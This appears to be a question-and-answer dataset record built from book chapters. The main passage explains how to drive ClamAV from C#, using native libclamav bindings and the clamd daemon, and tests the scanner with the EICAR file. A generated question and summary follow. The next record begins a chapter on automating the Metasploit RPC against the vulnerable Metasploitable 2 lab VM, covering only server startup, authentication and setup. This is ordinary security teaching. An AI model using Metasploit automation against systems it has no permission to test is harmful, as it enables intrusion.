native Library vs. the clamd network daemon\nWe’ll start by automating ClamAV using the native library libclamav. This\nallows us to use a local copy of ClamAV and its signatures to perform virus\nscanning; however, this requires that the ClamAV software and signatures\nbe properly installed and updated on the system or device. The engine\ncan be memory and CPU intensive, using up disk space for antivirus sig-\nnatures. Sometimes these requirements can take up more resources on\na machine than a programmer might like, so offloading the scanning to\nanother machine makes sense.\nYou may rather want to perform your antivirus scanning in a central\nspot—perhaps when an email server sends or receives an email—in which\ncase you won’t easily be able to use libclamav. Instead, you could use the\nclamd daemon to offload antivirus scanning from the email server to a dedi-\ncated virus-scanning server. You only need to keep one server’s antivirus\nsignatures up-to-date, and you won’t run as great a risk of bogging down\nyour email server.\nautomating with ClamaV’s native Library\nOnce you have ClamAV installed and running properly, you are ready\nto automate it. First, we’ll automate ClamAV using libclamav directly with\nP/Invoke (introduced in Chapter 1), which allows managed assemblies to\ncall functions from native, unmanaged libraries. Although you’ll have a\nhandful of supporting classes to implement, integrating ClamAV into your\napplication is relatively straightforward overall.\nAutomating ClamAV 193\nSetting Up the Supporting Enumerations and Classes\nWe’ll use a few helper classes and enumerations in the code. All the helper\nclasses are very simple—most are fewer than 10 lines of code. However, they\nmake the glue that holds the methods and classes together.\nThe Supporting Enumerations\nThe ClamDatabaseOptions enumeration, shown in Listing 10-3, is used in the\nClamAV engine to set options for the virus-lookup database we’ll use.\n[Flags]\npublic enum ClamDatabaseOptions\n{\nCL_DB_PHISHING = 0x2,\nCL_DB_PHISHING_URLS = 0x8,\nCL_DB_BYTECODE = 0x2000,\nuCL_DB_STDOPT = (CL_DB_PHISHING | CL_DB_PHISHING_URLS | CL_DB_BYTECODE),\n}\nListing 10-3: The ClamDatabaseOptions enum that defines the ClamAV database options\nThe ClamDatabaseOptions enum uses values taken directly from the\nClamAV C source for the database options. The three options enable\nthe signatures for phishing emails and for phishing URLs, as well as the\ndynamic bytecode signatures used in heuristic scanning. Combined, these\nthree make up ClamAV’s standard database options, which are used to scan\nfor viruses or malware. By using the bitwise OR operator to combine the\nthree option values, we come up with a bitmask of the combined options we\nwant to use defined in an enum u. Using bitmasks is a popular way of stor-\ning flags or options in a very efficient way.\nAnother enum we must implement is the ClamReturnCode enum, which cor-\nresponds to known return codes from ClamAV and is shown in Listing 10-4.\nAgain, these values were taken directly from the ClamAV source code.\npublic enum ClamReturnCode\n{\nuCL_CLEAN = 0x0,\nvCL_SUCCESS = 0x0,\nwCL_VIRUS = 0x1\n}\nListing 10-4: An enumeration to store the ClamAV return codes we are interested in\nThis isn’t a complete list of return codes by any means. I am only\nincluding the return codes I expect to see in the examples we’ll be writ-\ning. These are the clean u and success v codes, which indicate a scanned\nfile had no viruses or that an action was successful, respectively, and the\nvirus code w, which reports back that a virus was detected in a scanned file.\nIf you run into any error codes not defined in the ClamReturnCode enum, you\ncan look them up in the ClamAV source code in clamav.h. These codes are\ndefined in the cl_error_t struct in the header file.\n194 Chapter 10\nOur ClamReturnCode enum has three values, only two of which are dis-\ntinct. Both CL_CLEAN and CL_SUCCESS share the same value of 0x0 because 0x0\nmeans both that everything is running as expected and that a scanned file\nis clean. The other value, 0x1, is returned when a virus is detected.\nThe last enum we need to define is the ClamScanOptions enum, the most\ncomplicated of the enums we need. It’s shown in Listing 10-5.\n[Flags]\npublic enum ClamScanOptions\n{\nCL_SCAN_ARCHIVE = 0x1,\nCL_SCAN_MAIL = 0x2,\nCL_SCAN_OLE2 = 0x4,\nCL_SCAN_HTML = 0x10,\nuCL_SCAN_PE = 0x20,\nCL_SCAN_ALGORITHMIC = 0x200,\nvCL_SCAN_ELF = 0x2000,\nCL_SCAN_PDF = 0x4000,\nwCL_SCAN_STDOPT = (CL_SCAN_ARCHIVE | CL_SCAN_MAIL |\nCL_SCAN_OLE2 | CL_SCAN_PDF | CL_SCAN_HTML | CL_SCAN_PE |\nCL_SCAN_ALGORITHMIC | CL_SCAN_ELF)\n}\nListing 10-5: The class to hold the options for a ClamAV scan\nAs you can see, ClamScanOptions looks like a more complex version of\nClamDatabaseOptions. It defines a variety of file types that can be scanned\n(Windows PE executables u, Unix ELF executables v, PDFs, and so on)\nalong with a set of standard options w. As with the previous enumerations,\nthese enumeration values were taken directly from the ClamAV source code.\nThe ClamResult Supporting Class\nNow we need only implement the ClamResult class, shown in Listing 10-6, to\nround out the support required to drive libclamav.\npublic class ClamResult\n{\npublic uClamReturnCode ReturnCode { get; set; }\npublic string VirusName { get; set; }\npublic string FullPath { get; set; }\n}\nListing 10-6: The class that holds results of a ClamAV scan\nThis one is super simple! The first property is a ClamReturnCode u that\nstores the return code of a scan (which should usually be CL_VIRUS). We\nalso have two string properties: one to hold the name of the virus ClamAV\nreports back and one to hold the path to the file if we need it later. We’ll\nuse this class to store the results of each file scan as one object.\nAutomating ClamAV 195\nAccessing ClamAV’s Native Library Functions\nIn order to keep some separation of the native functions we’ll be consum-\ning from libclamav and the rest of the C# code and classes, we define a\nsingle class that holds all the ClamAV functions we’ll use (see Listing 10-7).\nstatic class ClamBindings\n{\nconst string u_clamLibPath = \"/Users/bperry/clamav/libclamav/.libs/libclamav.7.dylib\";\n[vDllImport(_clamLibPath)]\npublic extern static wClamReturnCode cl_init(uint options);\n[DllImport(_clamLibPath)]\npublic extern static IntPtr cl_engine_new();\n[DllImport(_clamLibPath)]\npublic extern static ClamReturnCode cl_engine_free(IntPtr engine);\n[DllImport(_clamLibPath)]\npublic extern static IntPtr cl_retdbdir();\n[DllImport(_clamLibPath)]\npublic extern static ClamReturnCode cl_load(string path, IntPtr engine,\nref uint signo, uint options);\n[DllImport(_clamLibPath)]\npublic extern static ClamReturnCode cl_scanfile(string path, ref IntPtr virusName,\nref ulong scanned, IntPtr engine, uint options);\n[DllImport(_clamLibPath)]\npublic extern static ClamReturnCode cl_engine_compile(IntPtr engine);\n}\nListing 10-7: The ClamBindings class, which holds all the ClamAV functions\nThe ClamBindings class first defines a string that is the full path u to\nthe ClamAV library we’ll be interfacing with. In this example, I am point-\ning to an OS X .dylib that I compiled from source to match the architecture\nof my Mono installation. Depending on how you compiled or installed\nClamAV, the path to the native ClamAV library may differ on your system.\nOn Windows, the file will be a .dll file in the /Program Files directory if you\nused the ClamAV installer. On OS X, it will be a .dylib file, and on Linux it\nwill be a .so file. On the latter systems, you could use find to locate the cor-\nrect library.\nOn Linux, something like this would print the path to any libclamav\nlibraries:\n$ find / -name libclamav*so$\nOn OS X, use this:\n$ find / -name libclamav*dylib$\n196 Chapter 10\nThe DllImport attribute v tells the Mono/.NET runtime to look for\nthe given function in the library we specified in the argument. This way,\nwe are able to directly call on ClamAV functions inside our program.\nWe’ll cover what the functions shown in Listing 10-7 do when we imple-\nment the ClamEngine class next. You can also see that we’re already using\nthe ClamReturnCode class w, which is returned when some of ClamAV’s native\nfunctions are called.\nCompiling the ClamAV Engine\nThe ClamEngine class in Listing 10-8 will do most of the real work of scanning\nand reporting on potentially malicious files.\npublic class ClamEngine : IDisposable\n{\nprivate uIntPtr engine;\npublic vClamEngine()\n{\nClamReturnCode ret = ClamBindings.wcl_init((uint)ClamDatabaseOptions.CL_DB_STDOPT);\nif (ret != ClamReturnCode.CL_SUCCESS)\nthrow new Exception(\"Expected CL_SUCCESS, got \" + ret);\nengine = ClamBindings.xcl_engine_new();\ntry\n{\nstring ydbDir = Marshal.PtrToStringAnsi(ClamBindings.cl_retdbdir());\nuint zsignatureCount = 0;\nret = ClamBindings.{cl_load(dbDir, engine, ref signatureCount,\n(uint)ClamScanOptions.CL_SCAN_STDOPT);\nif (ret != ClamReturnCode.CL_SUCCESS)\nthrow new Exception(\"Expected CL_SUCCESS, got \" + ret);\nret = (ClamReturnCode)ClamBindings.|cl_engine_compile(engine);\nif (ret != ClamReturnCode.CL_SUCCESS)\nthrow new Exception(\"Expected CL_SUCCESS, got \" + ret);\n}\ncatch\n{\nret = ClamBindings.cl_engine_free(engine);\nif (ret != ClamReturnCode.CL_SUCCESS)\nConsole.Error.WriteLine(\"Freeing allocated engine failed\");\nthrow;\n}\n}\nListing 10-8: The ClamEngine class, which scans and reports on files\nAutomating ClamAV 197\nFirst, we declare a class-level IntPtr variable u, called engine, which\nwill point to our ClamAV engine for the other methods in the class to use.\nAlthough C# doesn’t need a pointer to reference the exact address of an\nobject in memory, C does. C has pointers that are of the intptr_t data type,\nand IntPtr is the C# version of a C pointer. Since the ClamAV engine will\nbe passed back and forth between .NET and C, we need a pointer to refer\nto the address in memory where it is stored when we pass it to C. This is\nwhat happens when we create engine, which we’ll assign a value inside the\nconstructor.\nNext, we define the constructor. The constructor for the ClamEngine\nclass v doesn’t require any arguments. To initialize ClamAV to begin allo-\ncating engines to scan with, we call cl_init() w from the ClamBindings class\nby passing the signature database options we want to use when loading the\nsignatures. Just in case ClamAV doesn’t initialize, we check the return code\nof cl_init() and throw an exception if initialization failed. If ClamAV ini-\ntializes successfully, we allocate a new engine with cl_engine_new() x, which\ntakes no arguments and returns the pointer to the new ClamAV engine\nthat we store in the engine variable for later use.\nOnce we have an engine allocated, we need to load the antivirus sig-\nnatures to scan with. The cl_retdbdir() function returns the path to the\ndefinition database ClamAV is configured to use and stores it in the dbDir\nvariable y. Because cl_retdbdir() returns a C pointer string, we convert it\nto a regular string by using the function PtrToStringAnsi() on the Marshal\nclass, a class used to convert data types from managed types to unmanaged\n(and vice versa). Once we store the database path, we define an integer,\ns ignatureCount z, which is passed to cl_load() and assigned the number of\nsignatures that were loaded from the database.\nWe use cl_load() { from the ClamBindings class to load the signature\ndatabase into the engine. We pass the ClamAV database directory dbDir and\nthe new engine as arguments, along with a few other values. The last argu-\nment passed to cl_load() is an enumeration value for the types of files we\nwant to support scanning (such as HTML, PDF, or other specific types of\nfiles). We use the class we created earlier, ClamScanOptions, to define our scan\noptions as CL_SCAN_STDOPT so that we use the standard scan options. After we\nhave loaded the virus database (which can take several seconds, depending\non the options), we check whether the return code is equal to CL_SUCCESS\nagain; if it is, we finally compile the engine by passing it to the cl_engine_\ncompile() function |, which prepares the engine to begin scanning files.\nThen we check whether we received a CL_SUCCESS return code one last time.\nScanning Files\nIn order to scan files easily, we’ll wrap cl_scanfile() (the ClamAV library\nfunction that scans a file and reports back the result) with our own method,\nwhich we’ll call ScanFile(). This allows us to prepare the arguments we need\nto pass to cl_scanfile() and allows us to process and return the results from\nClamAV as one ClamResult object. This is shown in Listing 10-9.\n198 Chapter 10\npublic ClamResult ScanFile(string filepath, uint options = (uint)ClamScanOptions.uCL_SCAN_STDOPT)\n{\nvulong scanned = 0;\nwIntPtr vname = (IntPtr)null;\nClamReturnCode ret = ClamBindings.xcl_scanfile(filepath, ref vname, ref scanned,\nengine, options);\nif (ret == ClamReturnCode.CL_VIRUS)\n{\nstring virus = Marshal.yPtrToStringAnsi(vname);\nzClamResult result = new ClamResult();\nresult.ReturnCode = ret;\nresult.VirusName = virus;\nresult.FullPath = filepath;\nreturn result;\n}\nelse if (ret == ClamReturnCode.CL_CLEAN)\nreturn new ClamResult() { ReturnCode = ret, FullPath = filepath };\nelse\nthrow new Exception(\"Expected either CL_CLEAN or CL_VIRUS, got: \" + ret);\n}\nListing 10-9: The ScanFile() method, which scans and returns a ClamResult object\nThe ScanFile() method we implement takes two arguments, but we only\nneed the first, which is the path of the file to scan. The user can define scan\noptions with the second argument, but if a second argument isn’t specified,\nthen the standard scan options u we defined in ClamScanOptions will be used\nto scan the file.\nWe start the ScanFile() method by defining some variables to use. The\nscanned ulong type variable is initially set to 0 v. We won’t actually use this\nvariable after scanning the file, but the cl_scanfile() function requires it in\norder to be called correctly. The next variable we define is another IntPtr,\nwhich we call vname (for virus name) w. We set this initially to be null, but\nwe’ll later assign a C string pointer to it that points to a virus name in the\nClamAV database whenever a virus is found.\nWe use the cl_scanfile() function x we defined in ClamBindings to scan\nthe file and pass it a handful of arguments. The first argument is the file\npath we want to scan, followed by the variable that will be assigned the\nname of the detected virus, if any. The last two arguments are the engine\nwe will be scanning with and the scan options we want use to perform the\nvirus scan. The middle argument, scanned, is required to call cl_scanfile()\nbut isn’t useful for us here. We won’t use it again after passing it as an argu-\nment to this function.\nThe rest of the method packages the scan information nicely for the pro-\ngrammer’s use. If the return code of cl_scanfile() indicates a virus was found,\nwe use PtrToStringAnsi() y to return the string that the vname variable points\nto in memory. Once we have the virus name, we create a new ClamResult\nAutomating ClamAV 199\nclass z and assign it three properties using the cl_scanfile() return code, the\nvirus name, and the path to the scanned file. Then, we return the ClamResult\nclass to the caller. If the return code is CL_CLEAN, we return a new ClamResult\nclass with a ReturnCode of CL_CLEAN. If it is neither CL_CLEAN nor CL_VIRUS, how-\never, we throw an exception because we got a return code we didn’t expect.\nCleaning Up\nThe last method left to implement in the ClamEngine class is Dispose(), shown\nin Listing 10-10, which automatically cleans up after a scan in the context of\na using statement and is required by the IDisposable interface.\npublic void Dispose()\n{\nClamReturnCode ret = ClamBindings.ucl_engine_free(engine);\nif (ret != ClamReturnCode.CL_SUCCESS)\nConsole.Error.WriteLine(\"Freeing allocated engine failed\");\n}\n}\nListing 10-10: The Dispose() method, which automatically cleans up engines\nWe implement the Dispose() method because if we don’t free our ClamAV\nengine when we are done with it, it could become a memory leak. One draw-\nback of working with C libraries from a language like C# is that, because\nC# has garbage collection, many programmers don’t actively think about\ncleaning up after themselves. However, C does not have garbage collection.\nIf we allocate something in C, we need to free it when we are done with it.\nThis is what the cl_engine_free() function u does. To be diligent, we’ll also\ncheck to make sure that the engine was successfully freed by comparing\nthe return code to CL_SUCCESS. If they are the same, all is good. Otherwise,\nwe throw an exception because we should be able to free an engine we allo-\ncated, and if we can’t, this may point to a problem in the code.\nTesting the Program by Scanning the EICAR File\nNow we can bring it all together to scan something to test out our bindings.\nThe EICAR file is an industry-recognized text file used to test antivirus\nproducts. It isn’t harmful, but any functioning antivirus product should\ndetect it as a virus, so we’ll use it to test our program. In Listing 10-11, we\nuse the Unix cat command to print the contents of a test file used specifi-\ncally for testing antivirus—the EICAR file.\n$ cat ~/eicar.com.txt\nX5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*\nListing 10-11: Printing the contents of the EICAR antivirus test file\nThe short program in Listing 10-12 will scan any files specified as argu-\nments and print the results.\n200 Chapter 10\npublic static void Main(string[] args)\n{\nusing (uClamEngine e = new ClamEngine())\n{\nforeach (string file in args)\n{\nClamResult result = e.vScanFile(file); //pretty simple!\nif (result != null && result.ReturnCode == ClamReturnCode.wCL_VIRUS)\nConsole.WriteLine(\"Found: \" + result.VirusName);\nelse\nConsole.WriteLine(\"File Clean!\");\n}\n} //engine is disposed of here and the allocated engine freed automatically\n}\nListing 10-12: The Main() method of our program to automate ClamAV\nWe begin by creating our ClamEngine class u in the context of a using\nstatement so that we automatically clean up the engine when we are fin-\nished. We then iterate over each argument passed to Main() and assume it\nis a file path that we can scan with ClamAV. We pass each file path to the\nScanFile() method v and then check the result returned by ScanFile() to see\nif ClamAV has returned the CL_VIRUS return code w. If so, we print the virus\nname to the screen, as shown in Listing 10-13. Otherwise, we print the text\nFile Clean!\n$ mono ./ch10_automating_clamav_fs.exe ~/eicar.com.txt\nu Found: Eicar-Test-Signature\nListing 10-13: Running our ClamAV program on the EICAR file results in a virus\nidentification.\nIf the program prints Found: Eicar-Test-Signature u, then it works! This\nmeans that ClamAV scanned the EICAR file, matched it against the EICAR\ndefinition it has in its database, and returned the virus name for us. A great\nexercise for expanding this program would be to use a FileWatcher class that\nallows you to define directories to watch for any changes and then automati-\ncally scans the files that are changed or created in those folders.\nWe now have a working program that scans files with ClamAV. However,\nthere may be instances when you can’t effectively ship ClamAV with the appli-\ncation due to licensing (ClamAV is licensed with the GNU Public License)\nor technical reasons, but you still need a way to scan files for viruses on your\nnetwork. We’ll go over one other method to automate ClamAV that will solve\nthis problem in a more centralized way.\nautomating with clamd\nThe clamd daemon provides a great way to add virus scanning to an applica-\ntion that accepts file uploads from users or something similar. It operates\nAutomating ClamAV 201\nover the TCP, but with no SSL by default! It is also very lightweight, but it\nhas to be run on a server on your network, which results in some limitations.\nThe clamd service allows you to have a long-lived process running for scan-\nning files instead of needing to manage and allocate the ClamAV engine as\nin the previous automation. Because it’s a server version of ClamAV, you can\nuse clamd to scan files for computers without even installing the application.\nThis can be convenient when you only want to manage virus definitions in\none place or you have resource limitations and want to offload the virus scan-\nning to another machine, as discussed earlier. Getting automation working\nfor clamd is exceedingly simple in C#. It requires two small classes: a session\nand a manager.\nInstalling the clamd Daemon\nOn most platforms, installing ClamAV from the package manager might\nnot install the clamd daemon. For instance, on Ubuntu, you will need to\ninstall the clamav-daemon package separately with apt, as shown here:\n$ sudo apt-get install clamav-daemon\nOn Red Hat or Fedora, you’d install a slightly different package name:\n$ sudo yum install clamav-server\nStarting the clamd Daemon\nTo use clamd after installing the daemon, you need to start the daemon,\nwhich listens on port 3310 and address 127.0.0.1 by default. You can do this\nwith the clamd command, as shown in Listing 10-14.\n$ clamd\nListing 10-14: Starting the clamd daemon\nnote If you install clamd with a package manager, it may be configured by default to listen\non a local UNIX socket rather than on a network interface. If you are having trouble\nconnecting to the clamd daemon using a TCP socket, make sure that clamd is config-\nured to listen on a network interface!\nYou may not get any feedback when you run the command. No news\nis good news! If clamd starts with no messages, then you have successfully\nstarted it. We can test whether clamd is running properly with netcat by con-\nnecting to the listening port and seeing what happens when we manually\nrun commands on it, such as by getting the current clamd version and scan-\nning a file, as in Listing 10-15.\n$ echo VERSION | nc -v 127.0.0.1 3310\nClamAV 0.99/20563/Thu Jun 11 15:05:30 2015\n202 Chapter 10\n$ echo \"SCAN /tmp/eicar.com.txt\" | nc -v 127.0.0.1 3310\n/tmp/eicar.com.txt: Eicar-Test-Signature FOUND\nListing 10-15: Running simple commands for clamd using the netcat TCP utility\nConnecting to clamd and sending the VERSION command should print the\nClamAV version. You can also send the SCAN command with a file path as the\nargument, and it should return the scan results. Writing code to automate\nthis is easy.\nCreating a Session Class for clamd\nThe ClamdSession class requires almost no deep dive into how the code in\nthe class works because it’s so simple. We create some properties to hold the\nhost and port that clamd runs on, an Execute() method that takes a clamd()\ncommand and executes it, and a TcpClient class to create a new TCP stream\nto write the commands to, as shown in Listing 10-16. The TcpClient class was\nfirst introduced in Chapter 4 when we built custom payloads. We also used\nit in Chapter 7 when we automated the OpenVAS vulnerability scanner.\npublic class ClamdSession\n{\nprivate string _host = null;\nprivate int _port;\npublic uClamdSession(string host, int port)\n{\n_host = host;\n_port = port;\n}\npublic string vExecute(string command)\n{\nstring resp = string.Empty;\nusing (wTcpClient client = new TcpClient(_host, _port))\n{\nusing (NetworkStream stream = client.xGetStream())\n{\nbyte[] data = System.Text.Encoding.ASCII.GetBytes(command);\nstream.yWrite(data, 0, data.Length);\nzusing (StreamReader rdr = new StreamReader(stream))\nresp = rdr.ReadToEnd();\n}\n}\n{return resp;\n}\n}\nListing 10-16: The class to create a new clamd session\nAutomating ClamAV 203\nThe ClamdSession constructor u takes two arguments—the host and the\nport to connect to—and then assigns those to local class variables for the\nExecute() method to use. In the past, all of our session classes have imple-\nmented the IDisposable interface, but we really don’t need to do that with\nthe ClamdSession class. We don’t need to clean anything up when we are\ndone because clamd is a daemon that runs on a port and is a background\nprocess that can continue to run, so this saves us a bit of complexity.\nThe Execute() method v takes a single argument: the command to run\non the clamd instance. Our ClamdManager class will only implement a few of\nthe possible clamd commands available, so you should find researching the\nclamd protocol commands highly useful to see what other powerful com-\nmands are available to automate. To get the commands running and start\nreading the clamd response, we first create a new TcpClient class w that uses\nthe host and passes the port to the constructor as the TcpClient arguments.\nWe then call GetStream() x to make a connection to the clamd instance that\nwe can write our command to. Using the Write() method y, we write our\ncommand to the stream and then create a new StreamReader class to read the\nresponse z. Finally, we return the response to the caller {.\nCreating a clamd Manager Class\nThe simplicity of the ClamdSession class, which we define in Listing 10-17,\nmakes the ClamdManager class super simple as well. It just creates a construc-\ntor and two methods to execute the commands from Listing 10-15 that we\nhad executed manually.\npublic class ClamdManager\n{\nprivate ClamdSession _session = null;\npublic uClamdManager(ClamdSession session)\n{\n_session = session;\n}\npublic string vGetVersion()\n{\nreturn _session.Execute(\"VERSION\");\n}\npublic string wScan(string path)\n{\nreturn _session.Execute(\"SCAN \" + path);\n}\n}\nListing 10-17: The manager class for clamd\nThe ClamdManager constructor u takes a single argument—the session\nthat will be executing the commands—and assigns it to a local class vari-\nable called _session that the other methods can use.\n204 Chapter 10\nThe first method we create is the GetVersion() method v, which exe-\ncutes the clamd VERSION command by passing the string VERSION to Execute(),\nwhich we defined in the clamd session class. This command returns the\nversion information to the caller. The second method, Scan() w, takes a\nfile path as the argument, which it passes to Execute() with the clamd SCAN\ncommand. Now that we have both the session and manager classes, we can\nstick everything together.\nTesting with clamd\nPutting everything together takes only a handful of lines of code for a\nMain() method, as shown in Listing 10-18.\npublic static void Main(string[] args)\n{\nClamdSession session = new uClamdSession(\"127.0.0.1\", 3310);\nClamdManager manager = new ClamdManager(session);\nConsole.WriteLine(manager.vGetVersion());\nwforeach (string path in args)\nConsole.WriteLine(manager.Scan(path));\n}\nListing 10-18: The Main() method to automate clamd\nWe create the ClamdSession() u by passing 127.0.0.1 as the host to con-\nnect to and 3310 as the port on the host. Then we pass the new ClamdSession\nto the ClamdManager constructor. With a new ClamdManager(), we can print the\nversion v of the clamd instance; then we loop over w each argument passed\nto the program and try to scan the file and print the results to the screen\nfor the user. In our case, we will only test against one file, the EICAR test\nfile. However, you could put as many files to scan as your command shell\nallows.\nThe file we will scan needs to be on the server running the clamd dae-\nmon, so in order make this work across the network, you need a way to send\nthe file to the server in a place clamd can read it. This could be a remote net-\nwork share or other way of getting the file to the server. In this example, we\nhave clamd listening on 127.0.0.1 (localhost), and it has scanning access to\nmy home directory on my Mac, which is demonstrated in Listing 10-19.\n$ ./ch10_automating_clamav_clamd.exe ~/eicar.com.txt\nClamAV 0.99/20563/Thu Jun 11 15:05:30 2015\n/Users/bperry/eicar.com.txt: Eicar-Test-Signature FOUND\nListing 10-19: The clamd automating program scanning the hard-coded EICAR file\nYou’ll notice that using clamd is much faster than using the libclamav\nautomation. This is because a bulk of the time spent in the libclamav pro-\ngram was dedicated to allocating and compiling the engine, rather than\nactually scanning our file. The clamd daemon only has to allocate the engine\nAutomating ClamAV 205\nonce at startup; therefore, when we submit our file to be scanned, the results\nare much, much faster. We can test this by running the applications with\nthe time command, which will print the time it takes for the programs to\nrun, as shown in Listing 10-20.\n$ time ./ch10_automating_clamav_fs.exe ~/eicar.com.txt\nFound: Eicar-Test-Signature\nreal u0m11.872s\nuser 0m11.508s\nsys 0m0.254s\n$ time ./ch10_automating_clamav_clamd.exe ~/eicar.com.txt\nClamAV 0.99/20563/Thu Jun 11 15:05:30 2015\n/Users/bperry/eicar.com.txt: Eicar-Test-Signature FOUND\nreal v0m0.111s\nuser 0m0.087s\nsys 0m0.011s\nListing 10-20: A comparison of the time it took for the ClamAV and clamd applications to\nscan the same file\nNotice that our first program took 11 seconds u to scan the EICAR test\nfile but the second program using clamd took less than a second v.\nConclusion\nClamAV is a powerful and flexible antivirus solution for home and office use.\nIn this chapter, we were able to drive ClamAV in two distinct ways.\nFirst, we implemented some small bindings for the native libclamav\nlibrary. This allowed us to allocate, scan with, and free our ClamAV engines\nat will, but at the cost of needing to ship a copy of libclamav and allocate an\nexpensive engine each time we ran our program. We then implemented two\nclasses that allowed us to drive a remote clamd instance to retrieve ClamAV\nversion information and to scan a given file path on the clamd server. This\neffectively gave our program a nice speed boost, but at the cost of requiring\nthat the file to be scanned be on the server running clamd.\nThe ClamAV project is a great example of a large company (Cisco)\nreally supporting open source software that benefits everyone. You’ll find\nthat extending these bindings to better protect and defend your applica-\ntions, users, and network is a great exercise.\n206 Chapter 10",
    "question": "What are the two methods described for automating ClamAV to scan files for malware and viruses?",
    "summary": "ClamAV is an open-source antivirus tool used to scan emails and files for malware. This chapter explains how to automate ClamAV using either its native library or a remote daemon, allowing for efficient virus scanning. The native library approach requires installing and managing ClamAV on the system, while the daemon method allows scanning files on a remote server, which is more efficient and scalable."
  },
  {
    "start": 148,
    "end": 178,
    "text": "11\nau toMa tinG Me taSPloit\nMetasploit is the de facto open source\npenetration-testing framework. Written in\nRuby, Metasploit is both an exploit database\nand a framework for exploit development and\npenetration testing. But many of Metasploit’s most\npowerful features, such as its remote procedure call\n(RPC) API, are often overlooked.\nThis chapter introduces you to the Metasploit RPC and shows you how\nto use it to programmatically drive the Metasploit Framework. You’ll learn\nhow to use the RPC to automate Metasploit to exploit Metasploitable 2,\nan intentionally vulnerable Linux machine designed for learning how to\nuse Metasploit. Red teams or offensive security professionals should note\nthat many pieces of tedious work can be automated, thus freeing up time\nto focus more on the intricate or nonobvious vulnerabilities. With an API-\ndriven Metasploit Framework at your fingertips, you’ll be able to automate\ntedious tasks such as host discovery and even network exploitation in a sca-\nleable way.\nrunning the rPC Server\nSince we set up Metasploit in Chapter 4, I won’t go over how to set it up\nagain here. Listing 11-1 shows what you need to enter in order to run the\nRPC server.\n$ msfrpcd -U username -P password -S -f\nListing 11-1: Running the RPC server\nThe -U and -P arguments stand for the username and password that\nauthenticate the RPC. You can use whatever you want for the username or\npassword, but you will need the credentials when we write the C# code. The\n-S argument disables SSL. (Self-signed certificates make things a bit more\ncomplicated, so we’ll ignore them for now.) Finally, -f tells the RPC inter-\nface to run in the foreground to make the RPC process easier to monitor.\nTo use the new RPC interface that is running, either start a new ter-\nminal or restart msfrpcd without the -f option (which starts msfrpcd in the\nbackground) and then use Metasploit’s msfrpc client to connect to the RPC\nlistener that was just started and begin issuing calls. Be forewarned, though:\nthe msfrpc client is rather cryptic—it’s difficult to read and has unintuitive\nerror messages. Listing 11-2 shows the process of authenticating with the\nmsfrpcd server using the msfrpc client shipped with Metasploit.\n$ msfrpc u-U username v-P password w-S x-a 127.0.0.1\n[*] The 'rpc' object holds the RPC client interface\n[*] Use rpc.call('group.command') to make RPC calls\n>> yrpc.call('auth.login', 'username', 'password')\n=> {\"result\"=>\"success\", \"token\"=>\"TEMPZYFJ3CWFxqnBt9AfjvofOeuhKbbx\"}\nListing 11-2: Using the msfrpc client to authenticate with the msfrpcd server\nTo connect to the RPC listener with msfrpcd, we pass a few arguments\nto msfrpcd. The username and password we set on the RPC listener for\nauthentication are passed with -U u and -P v, respectively. The -S argu-\nment w tells msfrpc to not use SSL when connecting to the listener, and the\n-a argument x is the IP address to which the listener connects. Since we\nstarted our msfrpcd instance without specifying an IP address to listen on,\nthe default address of 127.0.0.1 is used.\nOnce connected to the RPC listener, we can use rpc.call() y to call API\nmethods that are available. We are going to test with the auth.login remote\nprocedure method because it will use the same username and password\nwe passed as the arguments. When you call rpc.call(), the RPC method\nand arguments are packed into a serialized MSGPACK blob that is sent to\nthe RPC server using an HTTP post request with a content type of binary/\nmessage-pack. These are important points to note because we need to do the\nsame things in C# to communicate with the RPC server.\nWe already have a lot of experience with the HTTP libraries, but\nMSGPACK serialization is certainly not a typical HTTP serialization format\n(you’re more likely to see XML or JSON). MSGPACK allows C# to read and\n208 Chapter 11\nrespond with complex data from the Ruby RPC server very efficiently, just\nas using JSON or XML would have been a potential bridge for the two lan-\nguages. As we work with MSGPACK, it should become clearer how MSGPACK\nserialization works.\ninstalling Metasploitable\nMetasploitable 2 has a specific vulnerability that is particularly simple to\nexploit: a backdoored Unreal IRC server. This is a great example of a vul-\nnerability with a Metasploit module that we can cut our teeth on with the\nMetasploit RPC. You can download Metasploitable 2 from either Rapid7\nat https://information.rapid7.com/metasploitable-download.html or VulnHub at\nhttps://www.vulnhub.com/.\nMetasploitable is shipped as a VMDK image in a ZIP archive, so install-\ning it into VirtualBox isn’t completely straightforward. After unzipping the\nMetasploitable VM and opening VirtualBox, follow these instructions:\n1. Click the New button in the top-left corner of VirtualBox to open\nthe wizard.\n2. Create a new VM named Metasploitable.\n3. Give it a Type of Linux and leave the Version as Ubuntu (64-bit); then\nclick continue or Next.\n4. Allocate between 512 MB and 1 GB RAM to the VM and then click\ncontinue or Next.\n5. In the Hard Disk dialog, select the Use an existing virtual hard disk\nfile option.\n6. Next to the hard disk drop-down is a small folder icon. Click this and\nnavigate to the folder into which you unzipped Metasploitable.\n7. Select the Metasploitable VMDK file and click Open in the bottom\nright of the dialog.\n8. In the Hard Disk dialog, click the Create button. This should close\nthe VM wizard.\n9. Start the new VM by clicking the Start button at the top of the\nVirtualBox window.\nOnce the virtual appliance has booted up, we need its IP address. To\nget the IP, after the appliance has booted up, log in with the credentials\nmsfadmin/msfadmin and then enter ifconfig at the bash shell to have the IP\nconfiguration printed to the screen.\nGetting the MSGPaCk Library\nWe need to get one more thing before we can start writing the code to drive\nour Metasploit instance using C#: the MSGPACK library. This library is not\npart of the core C# libraries, so we have to use NuGet, which is a .NET pack-\nage manager like pip (Python) or gem (Ruby), to install the correct library\nAutomating Metasploit 209\nwe want to use. By default, Visual Studio and Xamarin Studio have great\nNuGet package management support. However, the free MonoDevelop\navailable for Linux distros isn’t as up-to-date with the NuGet features as\nthese other IDEs. Let’s go over installing the correct MSGPACK library in\nMonoDevelop. It’s a bit roundabout, but using Xamarin Studio and Visual\nStudio should be much simpler because they don’t require you to use a spe-\ncific version of the MSGPACK library.\nInstalling the NuGet Package Manager for MonoDevelop\nFirst, you may need to install the NuGet add-in using the Add-in Manager\nin MonoDevelop. If so, open MonoDevelop and then follow these steps to\ninstall the NuGet package manager:\n1. Go to the Tools4Add-in Manager menu item.\n2. Click the Gallery tab.\n3. In the Repository drop-down list, select Manage Repositories.\n4. Click the Add button to add a new repository.\n5. In the Add New Repository dialog, ensure Register an on-line reposi-\ntory is selected. In the URL text box, enter the following URL:\nhttp://mrward.github.com/monodevelop-nuget-addin-repository/4.0/main.mrep\n6. Click OK and 